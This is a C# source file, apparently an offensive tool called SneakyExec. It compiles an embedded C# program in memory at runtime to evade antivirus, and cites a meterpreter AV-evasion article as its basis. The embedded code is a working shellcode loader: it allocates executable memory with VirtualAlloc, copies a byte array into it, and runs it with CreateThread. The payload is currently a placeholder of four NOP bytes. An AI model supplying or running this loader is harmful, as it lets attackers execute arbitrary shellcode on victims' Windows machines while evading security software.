using System;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;


namespace SneakyExec
{
    class Program
    {
        //using https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/ 
        // and using https://raw.githubusercontent.com/vysec/FSharp-Shellcode/master/FSharp-Shellcode.fs as base
     

        static void Main(string[] args)
        {
                string code= @"
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Namespace
{
    class Program
    {
                            private static UInt32 MEM_COMMIT = 0x1000;
                            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

                            [DllImport(""kernel32"")]
                            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
                                    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

                            [DllImport(""kernel32"")]
                            private static extern IntPtr CreateThread(
                                UInt32 lpThreadAttributes,
                                UInt32 dwStackSize,
                                UInt32 lpStartAddress,
                                IntPtr param,
                                UInt32 dwCreationFlags,
                                ref UInt32 lpThreadId
                                );

                            [DllImport(""kernel32"")]
                            private static extern UInt32 WaitForSingleObject(
                                IntPtr hHandle,
                                UInt32 dwMilliseconds
                                );

                            public void run()
                            {
                                byte[] shellcode = new byte[] { 0x90, 0x90, 0x90, 0x90 };

                                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                                IntPtr hThread = IntPtr.Zero;
                                UInt32 threadId = 0;
                                // prepare data


                                IntPtr pinfo = IntPtr.Zero;

                                // execute native code

                                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                                WaitForSingleObject(hThread, 0xFFFFFFFF);
                            }
                }
                }
";
            ExecuteCode(code, "Namespace", "Program", "run", false, null);
         }

        

        public static object ExecuteCode(string code, string namespacename, string classname, string functionname, bool isstatic, params object[] args)
        {
            object returnval = null;
            Assembly asm = BuildAssembly(code);
            object instance = null;
            Type type = null;
            if (isstatic)
            {
                type = asm.GetType(namespacename + "." + classname);
            }
            else
            {
                instance = asm.CreateInstance(namespacename + "." + classname);
                type = instance.GetType();
            }
            MethodInfo method = type.GetMethod(functionname);
            returnval = method.Invoke(instance, args);
            return returnval;
        }

        private static Assembly BuildAssembly(string code)
        {
            Microsoft.CSharp.CSharpCodeProvider provider = new CSharpCodeProvider();
            ICodeCompiler compiler = provider.CreateCompiler();
            CompilerParameters compilerparams = new CompilerParameters();
            compilerparams.GenerateExecutable = false;
            compilerparams.GenerateInMemory = true;
            CompilerResults results = compiler.CompileAssemblyFromSource(compilerparams, code);
            return results.CompiledAssembly;
        }

    }
}
